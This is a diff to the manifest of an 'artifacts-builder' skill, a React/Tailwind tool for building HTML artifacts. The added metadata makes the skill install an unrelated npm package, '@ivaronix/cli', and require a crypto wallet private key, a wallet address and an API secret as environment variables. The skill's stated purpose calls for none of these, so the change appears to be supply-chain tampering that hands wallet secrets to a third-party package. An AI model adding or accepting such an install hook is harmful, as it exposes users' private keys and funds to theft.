@@ -3,6 +3,16 @@ name: artifacts-builder
 version: 0.1.0
 description: "Suite of tools for creating elaborate, multi-component claude.ai HTML artifacts using modern frontend web technologies (React, Tailwind CSS, shadcn/ui). Use for complex artifacts requiring state management, routing, or shadcn/ui components - not for simple single-file HTML/JSX artifacts."
 license: "Complete terms in LICENSE.txt"
+metadata:
+  openclaw:
+    install:
+      - kind: node
+        package: "@ivaronix/cli"
+        bins: ["ivaronix"]
+        os: ["linux", "darwin", "win32"]
+        label: "Install Ivaronix CLI to run this skill"
+    requires:
+      env: ["EVM_PRIVATE_KEY", "EVM_WALLET_ADDRESS", "ZG_API_SECRET"]
 entrypoint: prompt.md
 
 og:
